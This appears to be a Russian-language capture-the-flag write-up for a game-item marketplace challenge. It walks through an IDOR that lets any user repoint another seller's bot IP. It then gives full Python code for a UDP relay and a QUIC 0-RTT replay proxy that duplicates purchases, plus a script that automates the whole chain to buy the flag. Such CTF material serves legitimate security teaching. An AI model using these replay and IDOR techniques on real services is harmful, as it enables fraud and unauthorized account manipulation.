Нам даны два url адреса. У меня это - `https://a9f3df53c8854e16.ctf.example/` и `https://758a2b1d8d1942b2.ctf.example/`.

>[!info] Об адресах
>Адреса выдаются динамически платформой, поэтому будут отличаться при каждом запуске

На `a9f3df53c8854e16` мы видим маркет для торговли игровыми предметами.

![Pasted image 20260904121753.png](attachments/Pasted%20image%2020260904121753.png)

На `758a2b1d8d1942b2` видим только 404 ошибку. Брут директорий ничего не дал.

Попробуем зарегистрироваться и осмотреть платформу.

![Pasted image 20260904121926.png](attachments/Pasted%20image%2020260904121926.png)

Видим предмет с ID `FLAG`. Вероятнее всего - это предмет с флагом, но денег на его покупку нет. Надо где-то получить x300 от нашего баланса. Также видим и другие предметы с динамической ценой. Попробовав себя в трейдинге, понимаем, что нельзя продать предмет по цене выше (практически всегда), чем купили.

Попробуем поисследовать страницу и видим скрытую вкладку с панелью продавца.

![Pasted image 20260904122337.png](attachments/Pasted%20image%2020260904122337.png)

Покажем её и посмотрим, что там.

![Pasted image 20260904122408.png](attachments/Pasted%20image%2020260904122408.png)

Домен бота ведёт в никуда, ID продавца - наш id на платформе, что отображается в top barе. А IP / хост пуст.

Попробуем назначить что-то.

![Pasted image 20260904122601.png](attachments/Pasted%20image%2020260904122601.png)

Но ничего не произошло. В запросах видим GET запрос на получение информации о продавце. Попробуем IDOR с каким-то ID.

На главной видим продавцов, а если открыть запросы и посмотреть в raw ответ `/api/catalog`, то увидим, что название продавца - это его ID на платформе. Пробуем подставить `house` и `platform`.

При `platform` мы получили, что бота нету у продавца.

![Pasted image 20260904123239.png](attachments/Pasted%20image%2020260904123239.png)

А при `house` мы получили конфигурацию продавца и подтвердили IDOR.

![Pasted image 20260907095658.png](attachments/Pasted%20image%2020260907095658.png)

Пробуем изменить значение `bot_ip` и у нас получается.

![Pasted image 20260904123610.png](attachments/Pasted%20image%2020260904123610.png)

Но теперь нельзя получить предмет, что мы купили, он всегда висит в статусе paid.  Если его поменять обратно, то покупка становится рабочей. А вот продажа работает безупречно, при изменённом ip адресе.

![Pasted image 20260904123719.png](attachments/Pasted%20image%2020260904123719.png)

Значит тот ip адрес зависимостью для покупки предметов.

Попробуем поставить адрес на свой сервер и посмотреть, что он пытается нам отправить в tcpdump.

![Pasted image 20260907232615.png](attachments/Pasted%20image%2020260907232615.png)

> Сервер, где был выполнен захват - 192.168.88.7, установлен в панели `192.168.88.7:7788`

Видим QUIC пакеты на порт 7788. Проанализируем содержимое пакета QUIC.

Видим, что пакеты, что к нам приходят - handshake. Попробуем их переотправить на сервер, что был изначально указан на сайте. Напишем python скрипт для пересылки: 

```python
import argparse  
import socket  
  
  
def hostport(s: str) -> tuple[str, int]:  
    host, _, port = s.rpartition(":")  
    return host, int(port)  
  
  
def main() -> None:  
    ap = argparse.ArgumentParser()  
    ap.add_argument("--listen", required=True, help="udp host:port to listen on")  
    ap.add_argument("--upstream", required=True, help="udp host:port to forward to")  
    args = ap.parse_args()  
  
    lhost, lport = hostport(args.listen)  
    uhost, uport = hostport(args.upstream)  
    upstream = (socket.gethostbyname(uhost), uport)  
  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    sock.bind((lhost, lport))  
    print(f"relay {lhost}:{lport} -> {upstream}")  
  
    client_addr = None  
    while True:  
        data, addr = sock.recvfrom(65535)  
        if addr == upstream:  
            if client_addr is not None:  
                sock.sendto(data, client_addr)  
        else:  
            client_addr = addr  
            sock.sendto(data, upstream)  
  
  
if __name__ == "__main__":  
    try:  
        main()  
    except KeyboardInterrupt:  
        print("\nbye")
```

И проанализируем пакеты, что ходят между серверами.

![Pasted image 20260907232923.png](attachments/Pasted%20image%2020260907232923.png)

При первой покупке - устанавливает соединение. Попробуем ещё раз купить.

![Pasted image 20260907233012.png](attachments/Pasted%20image%2020260907233012.png)

Видим 0-RTT пакет, вместе с рукопожатием. 

![Pasted image 20260907233549.png](attachments/Pasted%20image%2020260907233549.png)

Погуглив, что такое 0-RTT (Или вспомнив), поймём, что 0-RTT пакеты уязвимы к атаки ретрансляции. Те мы отправляем несколько пакетов вместо одного к конечному серверу. Реализуем это на python:

```python
import asyncio  
import logging  
import time  
  
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(name)s %(message)s")  
logger = logging.getLogger("attacker")  
  
LISTEN_ADDR = ("192.168.88.7", 7788)  # клиент подключается сюда  
SERVER_ADDR = ("192.168.88.9", 443)  # реальный сервер  
  
COUNT_REPLAY = 3  # Сколько раз подряд повторно шлём один и тот же 0-RTT пакет при каждом тике реплея.  
  
# Буфер захваченных именно 0-RTT датаграмм (не Initial/Handshake/1-RTT).  
captured_0rtt: asyncio.Queue[bytes] = asyncio.Queue()  
  
PACKER_0RTT_COUNT = 0  # Счётчик захваченных 0-RTT пакетов, для логов  
  
def is_0rtt_packet(data: bytes) -> bool:  
    """Проверяет по первому байту QUIC-заголовка, что это пакет типа 0-RTT  
     (Long Header). Так как парсить весь QUIC-заголовок довольно сложно,
     можно обнаруживать 0-RTT пакеты по Long header. Так как при 0-RTT пакете,
     клиент шлёт вместе с ним ещё и Initial. Да, будет много мусора, но это
     будет просто в реализации"""  
    if not data:  
        return False  
  
    first_byte = data[0]  
    header_form = (first_byte & 0x80) >> 7  # 1 = Long Header  
    fixed_bit = (first_byte & 0x40) >> 6  # обычно должен быть 1  
  
    if header_form != 1 or fixed_bit != 1:  
        return False  # короткий заголовок -> это уже 1-RTT пакет, не 0-RTT  
  
    return True  
  
  
class RelayProtocol(asyncio.DatagramProtocol):  
    def __init__(self):  
        self.transport = None  
        self.client_addr = None  
  
    def connection_made(self, transport):  
        self.transport = transport  
  
    def datagram_received(self, data: bytes, addr):  
        global PACKER_0RTT_COUNT  
  
        if addr == SERVER_ADDR:  
            # ответ сервера -> клиенту, форвардим как есть  
            if self.client_addr:  
                self.transport.sendto(data, self.client_addr)  
            return  
  
        # датаграмма от клиента к серверу  
        self.client_addr = addr  
  
        if is_0rtt_packet(data):  
            logger.warning(  
                "0-RTT пакет #%d (%d байт) — попадёт в очередь на реплей",  
                PACKER_0RTT_COUNT, len(data),  
            )  
            PACKER_0RTT_COUNT += 1  
            captured_0rtt.put_nowait(data)  
        else:  
            logger.info("Транзитный пакет (%d байт)", len(data))  
  
        # прозрачно форвардим оригинал серверу, атака не мешает легитимному трафику  
        self.transport.sendto(data, SERVER_ADDR)  
  
  
async def replay_loop():  
    """Бесконечный цикл: Получает из очереди пакет и повторно  
    отправляет серверу последний захваченный 0-RTT пакет."""
    loop = asyncio.get_event_loop()  
    transport, _ = await loop.create_datagram_endpoint(  
        asyncio.DatagramProtocol, remote_addr=SERVER_ADDR  
    )  
  
    replay_count = 0  
  
    while True:  
  
        target = await captured_0rtt.get()  
  
        replay_count += 1  
        for i in range(COUNT_REPLAY):  
            logger.warning(  
                "REPLAY #%d/%d: повторная отправка 0-RTT пакета серверу (%d байт)",  
                i + 1, COUNT_REPLAY, len(target),  
            )  
            transport.sendto(target)  
  
            transport.abort()  # Делаем там из-за дедупликации по SCID, просто открываем новое подключение  
            time.sleep(0.3)    # Ждём для удаления кеша SCID  
            transport, _ = await loop.create_datagram_endpoint(  
                asyncio.DatagramProtocol, remote_addr=SERVER_ADDR  
            )  
  
  
async def main():  
    loop = asyncio.get_event_loop()  
    await loop.create_datagram_endpoint(RelayProtocol, local_addr=LISTEN_ADDR)  
    logger.info(  
        f"Прокси запущен: {LISTEN_ADDR[0]}:{LISTEN_ADDR[1]} -> {SERVER_ADDR[0]}:{SERVER_ADDR[1]}. "  
    )  
  
    # replay_loop работает вечно параллельно с приёмом/форвардингом пакетов  
    await replay_loop()  
  
  
if __name__ == "__main__":  
    try:  
        asyncio.run(main())  
    except KeyboardInterrupt:  
        logger.info("Остановлено пользователем")
```

Запускаем и пробуем купить предмет.

![Pasted image 20260908000205.png](attachments/Pasted%20image%2020260908000205.png)

Видим сразу несколько 0-RTT пакетов, что отправляются с разных портов (разные соединения).

Посмотрим в инвентарь и увидим ~3 предмета, когда мы купили только 1. Продаём и покапаем заново. 

![Pasted image 20260908000520.png](attachments/Pasted%20image%2020260908000520.png)

Можно ещё и автоматизировать:

```python
import argparse  
import time  
import uuid  
  
import httpx  
  
  
def main() -> None:  
    ap = argparse.ArgumentParser()  
    ap.add_argument("--base", default="https://a9f3df53c8854e16.ctf.example/")  
    ap.add_argument("--send-ip", required=True, help="Адрес возврата пакетов 0-RTT.")  
    ap.add_argument("--settle-wait", type=float, default=12.0, help="секунды на ожидание")  
    args = ap.parse_args()  
  
    c = httpx.Client(base_url=args.base, timeout=30, verify=False)  
    login = "solver_" + uuid.uuid4().hex[:8]  
  
    r = c.post("/api/register", json={"login": login, "password": "pw123456"}) # регистрируемся  
    r.raise_for_status()  
    c.headers["Authorization"] = f"Bearer {r.json()['token']}"  
    print(f"[+] зарегистрирован {login}")  
  
    # read the house bot without owning it, then repoint it (no ownership check)  
    print("[+] оригинальный ip бота:", c.get("/api/seller/bot", params={"seller_id": "house"}).json())  
    c.post("/api/seller/bot", json={"seller_id": "house", "bot_ip": args.send_ip}).raise_for_status()  
    print(f"[+] IP на замену -> {args.send_ip}")  
  
    def balance() -> float: # Получаем свой баланс  
        return c.get("/api/me").json()["balance"]  
  
    def ads_qty() -> int:  # Получаем свои предметы ADS  
        for it in c.get("/api/inventory").json():  
            if it["item_id"] == "ADS":  
                return it["qty"]  
        return 0  
  
    flag_price = next(x["price"] for x in c.get("/api/catalog").json() if x["item_id"] == "FLAG") # Цена на флаг  
  
    qty = 1  
    for cycle in range(1, 41):  
        bal = balance()  
        if bal >= flag_price:  
            break  
        buy_price = c.get("/api/market/prices", params={"item_id": "ADS"}).json()["buy_price"]  # Получаем цену на покупку ADS  
        qty = max(1, min(qty, int(bal // (buy_price * 1.1)) or 1))  # Считаем сколько можем купить  
  
        before = ads_qty()  
        c.post("/api/market/buy", json={"item_id": "ADS", "qty": qty}).raise_for_status()  # Покупаем  
        time.sleep(args.settle_wait)  # Ждём, пока replay пройдёт  
        got = ads_qty() - before  # Считаем сколько получили  
        if got > 0:  
            c.post("/api/market/sell", json={"item_id": "ADS", "qty": got})  
  
        note = "" if got > qty else "  (Нет дубликации -- Действительно репликатор в --send-ip?)"  
        print(f"[Цикл {cycle}] ${bal:.2f} -> ${balance():.2f}  куплено {qty}, получено {got}{note}")  
        qty = min(qty * 2, 20000)  
    else:  
        print("[-] Сдаёмся, не достигнув цены флага")  
        return  
  
    print(f"[+] Баланс ${balance():.2f} >= flag ${flag_price}")  
    c.post("/api/market/buy", json={"item_id": "FLAG", "qty": 1}).raise_for_status()  # Покупаем флаг  
    for it in c.get("/api/inventory").json():  
        if it.get("content"):  
            print(f"[+] FLAG: {it['content']}")  # Печатаем флаг  
            return  
    print("[-] Флага нет в инвентаре, что-то пошло не так")  
  
  
if __name__ == "__main__":  
    main()
```

Получаем флаг:

![Pasted image 20260908001756.png](attachments/Pasted%20image%2020260908001756.png)

Либо из самого сайта:

![Pasted image 20260908001900.png](attachments/Pasted%20image%2020260908001900.png)

Флаг - `flag{th3_c0r3_k33ps_1ts_s3cr3ts}`